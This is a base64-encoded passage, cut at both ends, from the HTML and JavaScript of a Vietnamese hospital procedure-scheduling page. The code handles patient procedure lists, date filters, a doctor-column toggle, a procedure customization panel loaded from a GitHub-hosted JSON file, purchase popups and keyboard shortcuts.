CA9IG51bGw7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBi4buZIGzhu41jIG5nw6B5IGNobyBjaGkgdGnhur90IGLhu4duaCBuaMOibg0KZnVuY3Rpb24gdXBkYXRlUGF0aWVudERhdGVGaWx0ZXIocHJvY2VkdXJlcykgew0KICAgIGNvbnN0IGRhdGVzID0gWy4uLm5ldyBTZXQocHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV0uc29ydCgoYSwgYikgPT4gew0KICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICB9KTsNCiAgICANCiAgICBjb25zdCBzZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERhdGVGaWx0ZXInKTsNCiAgICBzZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBuZ8OgeTwvb3B0aW9uPicgKw0KICAgICAgICBkYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgY2hpIHRp4bq/dCB0aOG7pyB0aHXhuq10IGPhu6dhIGLhu4duaCBuaMOibg0KZnVuY3Rpb24gcmVuZGVyUGF0aWVudERldGFpbChwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbEJvZHknKTsNCiAgICBjb25zdCBkYXRlRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREYXRlRmlsdGVyJykudmFsdWU7DQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIA0KICAgIC8vIEzhu41jIHRoZW8gbmfDoHkNCiAgICBsZXQgZmlsdGVyZWRQcm9jZWR1cmVzID0gcHJvY2VkdXJlczsNCiAgICBpZiAoZGF0ZUZpbHRlciAhPT0gJ2FsbCcpIHsNCiAgICAgICAgZmlsdGVyZWRQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLmRhdGUgPT09IGRhdGVGaWx0ZXIpOw0KICAgIH0NCiAgICANCiAgICAvLyBT4bqvcCB44bq/cCB0aGVvIG5nw6B5IHbDoCB0aOG7nWkgZ2lhbg0KICAgIGZpbHRlcmVkUHJvY2VkdXJlcy5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgIGlmIChhLmRhdGUgIT09IGIuZGF0ZSkgew0KICAgICAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5kYXRlLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLmRhdGUuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGEuc3RhcnQgLSBiLnN0YXJ0Ow0KICAgIH0pOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KICAgIA0KICAgIGlmIChmaWx0ZXJlZFByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHRib2R5LmlubmVySFRNTCA9ICc8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+S2jDtG5nIGPDsyB0aOG7pyB0aHXhuq10IG7DoG88L3RkPjwvdHI+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTmFtZSA9ICdwYXRpZW50LWRldGFpbC1yb3cnOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPiR7cHJvYy5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7cHJvYy5kYXRlfTxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0gLT4gJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7c2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSd9Ij4ke3Byb2MuZG9jdG9yfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCi8vIFRow6ptIHPhu7Ega2nhu4duIGNobyBjw6FjIGLhu5kgbOG7jWMNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCiAgICAvLyBC4buZIGzhu41jIHRyb25nIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREb2N0b3JGaWx0ZXInKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCByZW5kZXJQYXRpZW50TGlzdCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRTZWFyY2gnKS5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIHJlbmRlclBhdGllbnRMaXN0KTsNCiAgICANCiAgICAvLyBC4buZIGzhu41jIHRyb25nIGNoaSB0aeG6v3QgYuG7h25oIG5ow6JuDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREYXRlRmlsdGVyJykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGlmIChjdXJyZW50UGF0aWVudCAmJiBjdXJyZW50UGF0aWVudC5wcm9jZWR1cmVzKSB7DQogICAgICAgICAgICByZW5kZXJQYXRpZW50RGV0YWlsKGN1cnJlbnRQYXRpZW50LnByb2NlZHVyZXMpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGhp4buDbiB0aOG7iyBj4buZdCBiw6FjIHPEqSBraGkgY2hlY2tib3ggdGhheSDEkeG7lWkNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGNvbnN0IHNob3dEb2N0b3IgPSB0aGlzLmNoZWNrZWQ7DQogICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNwYXRpZW50RGV0YWlsQm9keSAuZG9jdG9yLWNvbHVtbicpLmZvckVhY2godGQgPT4gew0KICAgICAgICAgICAgdGQuc3R5bGUuZGlzcGxheSA9IHNob3dEb2N0b3IgPyAnJyA6ICdub25lJzsNCiAgICAgICAgfSk7DQogICAgICAgIA0KICAgICAgICAvLyBDxaluZyBj4bqtcCBuaOG6rXQgdHJvbmcgZGFuaCBzw6FjaCBi4buHbmggbmjDom4gbuG6v3UgbW9kYWwgxJFhbmcgbeG7nw0KICAgICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRMaXN0TW9kYWwnKS5zdHlsZS5kaXNwbGF5ID09PSAnYmxvY2snKSB7DQogICAgICAgICAgICByZW5kZXJQYXRpZW50TGlzdCgpOw0KICAgICAgICB9DQogICAgfSk7DQp9KTsNCi8vIMSQw7NuZyBtb2RhbCBi4bqxbmcgRVNDDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmtleSA9PT0gJ0VzY2FwZScpIHsNCiAgICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdE1vZGFsJykuc3R5bGUuZGlzcGxheSA9PT0gJ2Jsb2NrJykgew0KICAgICAgICAgICAgY2xvc2VQYXRpZW50TGlzdCgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbE1vZGFsJykuc3R5bGUuZGlzcGxheSA9PT0gJ2Jsb2NrJykgew0KICAgICAgICAgICAgY2xvc2VQYXRpZW50RGV0YWlsKCk7DQogICAgICAgIH0NCiAgICB9DQp9KTs8L3NjcmlwdD4NCjwhLS0gUE9QVVAgVFXhu7IgQknhur5OIFRI4bumIFRIVeG6rFQgLS0+DQo8ZGl2IGlkPSJjdXN0b21pemVNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwNjA7Ij4NCiAgPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSIgb25jbGljaz0iY2xvc2VDdXN0b21pemVQYW5lbCgpIj48L2Rpdj4NCiAgPGRpdiBjbGFzcz0ibW9kYWwtYmFzZSBtb2RhbC1zbWFsbCI+DQogIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47DQogICAgICAgICAgICBwYWRkaW5nOjE0cHggMTZweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgPGgzIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MThweCI+QuG6o25nIFR14buzIGJp4bq/biBUaOG7pyB0aHXhuq10PC9oMz4NCiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6ZmxleC1lbmQ7Z2FwOjZweDsiPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9InNob3dOb1Blcm1pc3Npb24oKSINCiAgICAgICAgICBzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIFRow6ptDQogIDwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlQ3VzdG9taXplUGFuZWwoKSINCiAgICAgICAgICBzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIMSQw7NuZw0KICA8L2J1dHRvbj4NCjwvZGl2Pg0KPC9kaXY+DQogICAgPGRpdiBzdHlsZT0icGFkZGluZzowcHggMTZweCI+DQogICAgDQogICAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICA8dHI+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjYwcHgiPlNUVDwvdGg+DQogICAgICAgICAgICA8dGg+VGjhu6cgVGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjEzMHB4Ij5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjExMHB4Ij5DaHXhuqluIGLhu4s8L3RoPg0KICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keSBpZD0iY3VzdG9taXplQm9keSI+PC90Ym9keT4NCiAgICAgIDwvdGFibGU+DQogIDwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KICBjb25zdCBUSFVUSFVBVF9VUkwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfdGh1dGh1YXQudHh0JzsNCg0KICBhc3luYyBmdW5jdGlvbiBvcGVuQ3VzdG9taXplUGFuZWwoKSB7DQogICAgdHJ5IHsNCiAgICAgIGlmICghd2luZG93LlBST0NFRFVSRVMgfHwgT2JqZWN0LmtleXMod2luZG93LlBST0NFRFVSRVMpLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChUSFVUSFVBVF9VUkwpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgd2luZG93LlBST0NFRFVSRVMgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgICAgfQ0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgIGFsZXJ0KCdLaMO0bmcgdGjhu4MgdOG6o2kgZGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10IHThu6sgbcOheSBjaOG7py4nKTsNCiAgICAgIHJldHVybjsNCiAgICB9DQogICAgY29uc3Qgcm93cyA9IFtdOw0KICAgIE9iamVjdC5lbnRyaWVzKFBST0NFRFVSRVMpLmZvckVhY2goKFtuYW1lLCBjZmddKSA9PiB7DQogICAgICBpZiAoIW5hbWUgfHwgIWNmZykgcmV0dXJuOw0KDQogICAvLyB0csaw4bubYyDEkcOzOg0KbGV0IGR1cmF0aW9uID0gKHR5cGVvZiBjZmcuZHVyYXRpb24gPT09ICdudW1iZXInKSA/IGNmZy5kdXJhdGlvbiA6ICcnOw0KLy8gTuG6v3UgY8OzIHByZXAgdGjDrCBs4bqleSBwcmVwLCBu4bq/dSBraMO0bmcgY8OzIHRow6wgZ8OhbiA9IGR1cmF0aW9uDQpsZXQgcHJlcCA9ICh0eXBlb2YgY2ZnLnByZXAgPT09ICdudW1iZXInKSA/IGNmZy5wcmVwIDogZHVyYXRpb247DQoNCi8vIMOpcCByacOqbmcgY2hvICJT4bqvYyB0aHXhu5FjIHRoYW5nIg0KaWYgKG5hbWUudHJpbSgpLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoJ3Phuq9jIHRodeG7kWMgdGhhbmcnKSkgew0KICBkdXJhdGlvbiA9IDEyMDsNCiAgcHJlcCA9IDEyMDsNCn0NCiAgICAgIGlmIChkdXJhdGlvbiAhPT0gJycpIHsNCiAgICAgICAgcm93cy5wdXNoKHsgbmFtZSwgZHVyYXRpb24sIHByZXAgfSk7DQogICAgICB9DQogICAgfSk7DQoNCiAgICByb3dzLnNvcnQoKGEsYikgPT4gYS5uYW1lLmxvY2FsZUNvbXBhcmUoYi5uYW1lLCAndmknKSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gcm93cy5tYXAoKHIsIGlkeCkgPT4gYA0KICAgICAgPHRyPg0KICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4ke2lkeCArIDF9PC90ZD4NCiAgICAgICAgPHRkPiR7ci5uYW1lfTwvdGQ+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7ci5kdXJhdGlvbn08L3RkPg0KICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4ke3IucHJlcH08L3RkPg0KICAgICAgPC90cj4NCiAgICBgKS5qb2luKCcnKTsNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9DQoNCiAgZnVuY3Rpb24gY2xvc2VDdXN0b21pemVQYW5lbCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3VzdG9taXplTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICB9DQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQpmdW5jdGlvbiBzaG93Tm9QZXJtaXNzaW9uKCkgew0KICAvLyBPdmVybGF5DQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgb3ZlcmxheS5zdHlsZS5jc3NUZXh0ID0gYA0KICAgIHBvc2l0aW9uOmZpeGVkO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7DQogICAgZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO3otaW5kZXg6MTIwMDA7YDsNCiAgLy8gQm94DQogIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KYm94LmNsYXNzTmFtZSA9J3BvcHVwLXNtYWxsJzsNCiAgYm94LmlubmVySFRNTCA9IGANCiAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6MThweDtmb250LXdlaWdodDo2MDA7Y29sb3I6I2U3NGMzYzttYXJnaW4tYm90dG9tOjEwcHg7Ij4NCiAgICAgIPCfmqsgQuG6oW4ga2jDtG5nIGPDsyBxdXnhu4FuIHRow6ptIHRo4bunIHRodeG6rXQNCiAgICA8L2Rpdj4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQodGhpcy5jbG9zZXN0KCcubm9QZXJtT3ZlcmxheScpKSI+DQogICAgICDEkMOzbmcNCiAgICA8L2J1dHRvbj4NCiAgYDsNCiAgb3ZlcmxheS5jbGFzc0xpc3QuYWRkKCJub1Blcm1PdmVybGF5Iik7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4gew0KICAgIGlmIChlLnRhcmdldCA9PT0gb3ZlcmxheSkgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgfSk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQp9DQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgew0KICBpZiAoZS50YXJnZXQgJiYgZS50YXJnZXQuaWQgPT09ICJidXkiKSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIH0NCn0pOw0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIC8vIE3hu58gcG9wdXAgYuG6o25nIGdpw6EgbuG6v3UgY2xpY2sgdsOgbyBuw7p0IGlkPWJ1eQ0KICBpZiAoZS50YXJnZXQgJiYgZS50YXJnZXQuaWQgPT09ICJidXkiKSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogICAgcmV0dXJuOw0KICB9DQogIC8vIMSQw7NuZyBwb3B1cCBraGkgY2xpY2sgcmEgbmdvw6BpIHBo4bqnbiBu4buZaSBkdW5nDQogIGNvbnN0IHBvcHVwcyA9IFsiYnV5UG9wdXAiLCAicGF5bWVudFBvcHVwIiwgImNvbmZpcm1Qb3B1cCJdOw0KICBwb3B1cHMuZm9yRWFjaChpZCA9PiB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7DQogICAgaWYgKHBvcHVwICYmIHBvcHVwLnN0eWxlLmRpc3BsYXkgPT09ICJmbGV4IiAmJiBlLnRhcmdldCA9PT0gcG9wdXApIHsNCiAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9KTsNCn0pOw0KLy8gxJBp4buBdSBoxrDhu5tuZyBuaGFuaCBi4bqxbmcgcGjDrW0gc+G7kQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIGZ1bmN0aW9uKGUpIHsNCiAgICBpZiAoZS5jb2RlID09PSAiRjciKSB7DQogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgY29uc3QgY2hlY2tib3ggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94Jyk7DQogICAgICAgIGlmIChjaGVja2JveCkgew0KICAgICAgICAgICAgY2hlY2tib3guY2hlY2tlZCA9ICFjaGVja2JveC5jaGVja2VkOyAgDQogICAgICAgICAgICAvLyBLw61jaCBob+G6oXQgc+G7sSBraeG7h24gY2hhbmdlIMSR4buDIGPhuq1wIG5o4bqtdCBnaWFvIGRp4buHbg0KICAgICAgICAgICAgY29uc3QgZXZlbnQgPSBuZXcgRXZlbnQoJ2NoYW5nZScpOw0KICAgICAgICAgICAgY2hlY2tib3guZGlzcGF0Y2hFdmVudChldmVudCk7ICAgICAgICAgICAgDQogICAgICAgIH0NCiAgICB9DQogICAgLy8gRjcgLSBUb2dnbGUgY2hlY2tib3ggIkhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oIg0KICAgIGlmIChlLmNvZGUgPT09ICJGOCIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKTsNCiAgICAgICAgaWYgKGNoZWNrYm94KSB7DQogICAgICAgICAgICBjaGVja2JveC5jaGVja2VkID0gIWNoZWNrYm94LmNoZWNrZWQ7DQogICAgICAgICAgICAvLyBLw61jaCBob+G6oXQgc+G7sSBraeG7h24gY2hhbmdlIMSR4buDIGPhuq1wIG5o4bqtdCBnaWFvIGRp4buHbg0KICAgICAgICAgICAgY29uc3QgZXZlbnQgPSBuZXcgRXZlbnQoJ2NoYW5nZScpOw0KICAgICAgICAgICAgY2hlY2tib3guZGlzcGF0Y2hFdmVudChldmVudCk7ICAgICAgICAgIA0KICAgICAgICB9DQogICAgfQ0KDQogICAgLy8gPT09PSBNQVAgQ8OBQyBC4bqiTkcgPT09PQ0KICAgIGNvbnN0IHNlY3Rpb25NYXAgPSB7DQogICAgICAgICJGMSI6ICJlcnJvclNlY3Rpb24iLA0KICAgICAgICAiRjIiOiAicmVzdWx0U2VjdGlvbiIsDQogICAgICAgICJGMyI6ICJtYWNoaW5lRXJyb3JTZWN0aW9uIiwNCiAgICAgICAgIkY0IjogIm1hY2hpbmVDb25mbGljdFNlY3Rpb24iLA0KICAgICAgICAiRjUiOiAibWlzc2luZ01hY2hpbmVTZWN0aW9uIiwNCgkJIkY2IjogImRhdGVNaXNtYXRjaFNlY3Rpb24iDQogICAgfTsNCiAgICAvLyA9PT09IEYxMCDihpIgUmVsb2FkIHRyYW5nID09PT0NCiAgICBpZiAoZS5jb2RlID09PSAiRjEwIikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGxvY2F0aW9uLnJlbG9hZCgpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIC8vID09PT0gQ3RybCArIE8g4oaSIE3hu58gZmlsZSA9PT09DQogICAgaWYgKGUuY3RybEtleSAmJiAhZS5zaGlmdEtleSAmJiBlLmtleS50b0xvd2VyQ2FzZSgpID09PSAibyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidHJpZ2dlckJ1dHRvbiIpPy5jbGljaygpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIC8vID09PT0gQ3RybCArIFNoaWZ0ICsgTyDihpIgTeG7nyB0aMawIG3hu6VjID09PT0NCiAgICBpZiAoZS5jdHJsS2V5ICYmIGUuc2hpZnRLZXkgJiYgZS5rZXkudG9Mb3dlckNhc2UoKSA9PT0gIm8iKSB7DQogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZvbGRlckJ0biIpPy5jbGljaygpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIC8vID09PT0gTuG6v3Uga2jDtG5nIHBo4bqjaSBGMeKAk0Y1IHRow6wgYuG7jyBxdWEgPT09PQ0KICAgIGlmICghWyJGMSIsIkYyIiwiRjMiLCJGNCIsIkY1IiwiRjYiXS5pbmNsdWRlcyhlLmtleSkpIHJldHVybjsNCiAgICBjb25zdCB0YXJnZXRJZCA9IHNlY3Rpb25NYXBbZS5rZXldOw0KICAgIGNvbnN0IHRhcmdldCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHRhcmdldElkKTsNCiAgICBpZiAoIXRhcmdldCkgcmV0dXJuOw0KICAgIC8vIOKchSBO4bq/dSBDYXBzTG9jayBi4bqtdCDihpIg4bqobiBo4bq/dCAmIGNo4buJIGhp4buHbiAxIGLhuqNuZw0KICAgIGlmIChlLmdldE1vZGlmaWVyU3RhdGUoIkNhcHNMb2NrIikpIHsNCiAgICAgICAgT2JqZWN0LnZhbHVlcyhzZWN0aW9uTWFwKS5mb3JFYWNoKHNlYyA9PiB7DQogICAgICAgICAgICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHNlYyk7DQogICAgICAgICAgICBpZiAoZWwpIGVsLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIH0pOw0KICAgICAgICB0YXJnZXQuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICAgIC8vIOKchSBMdcO0biBzY3JvbGwgdOG7m2kgYuG6o25nDQogICAgdGFyZ2V0LnNjcm9sbEludG9WaWV3KHsgYmVoYXZpb3I6ICdzbW9vdGgnLCBibG9jazogJ3N0YXJ0JyB9KTsNCn0pOw0KLy8gVGjDqm0gc+G7sSBraeG7h24gY2hvIGNoZWNrYm94IHNob3dEb2N0b3IgxJHhu4MgY+G6rXAgbmjhuq10IHThuqV0IGPhuqMgY8OhYyBi4bqjbmcNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAvLyBD4bqtcCBuaOG6rXQgY8OhYyBi4bqjbmcgbcOheQ0KICAgIGlmIChtYWNoaW5lRXJyb3JMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1hY2hpbmVFcnJvcnMoKTsNCiAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCk7DQogICAgaWYgKG1pc3NpbmdNYWNoaW5lTG9nLmxlbmd0aCA+IDApIGRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpOw0KCWlmIChkYXRlTWlzbWF0Y2hMb2cubGVuZ3RoID4gMCkgZGlzcGxheURhdGVNaXNtYXRjaEVycm9ycygpOw0KfSk7DQovLyA9PT09IEY5IOKGkiBU4buxIMSR4buZbmcgxJHEg25nIG5o4bqtcCBkb2N0b3IgPT09PQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIGZ1bmN0aW9uKGUpIHsNCiAgICBpZiAoZS5jb2RlID09PSAiRjkiKSB7DQogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gY8OzIMSRYW5nIOG7nyB0cmFuZyDEkcSDbmcgbmjhuq1wIGtow7RuZw0KICAgICAgICBjb25zdCBsb2dpblNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJyk7DQogICAgICAgIGlmIChsb2dpblNlY3Rpb24gJiYgbG9naW5TZWN0aW9uLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJykgew0KICAgICAgICAgICAgLy8gx